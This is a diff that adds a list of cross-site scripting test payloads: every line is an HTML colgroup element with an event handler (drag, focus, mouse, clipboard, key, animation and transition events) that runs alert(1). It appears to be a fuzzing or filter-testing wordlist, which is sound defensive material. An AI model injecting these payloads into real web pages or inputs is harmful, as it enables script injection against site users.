@@ -1,0 +1,42 @@
+<colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragend="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragenter="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragleave="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragstart="alert(1)">test</colgroup>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
+<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>
+<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
+<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onclick="alert(1)">test</colgroup>
+<colgroup oncontextmenu="alert(1)">test</colgroup>
+<colgroup oncopy="alert(1)" contenteditable>test</colgroup>
+<colgroup oncut="alert(1)" contenteditable>test</colgroup>
+<colgroup ondblclick="alert(1)">test</colgroup>
+<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onkeydown="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeypress="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeyup="alert(1)" contenteditable>test</colgroup>
+<colgroup onmousedown="alert(1)">test</colgroup>
+<colgroup onmouseenter="alert(1)">test</colgroup>
+<colgroup onmouseleave="alert(1)">test</colgroup>
+<colgroup onmousemove="alert(1)">test</colgroup>
+<colgroup onmouseout="alert(1)">test</colgroup>
+<colgroup onmouseover="alert(1)">test</colgroup>
+<colgroup onmouseup="alert(1)">test</colgroup>
+<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
+<div draggable="true" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>
+<div draggable="true" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>
+<style>:target {color: red;}</style><colgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></colgroup>
+<style>:target {color:red;}</style><colgroup id=x style="transition:color 1s" ontransitionend=alert(1)></colgroup>
+<style>:target {transform: rotate(180deg);}</style><colgroup id=x style="transition:transform 2s" ontransitionrun=alert(1)></colgroup>
+<style>@keyframes slidein {}</style><colgroup style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></colgroup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style="position:absolute;" onanimationcancel="alert(1)"></colgroup>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationend="alert(1)"></colgroup>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
+<svg><colgroup onload=alert(1)></colgroup>
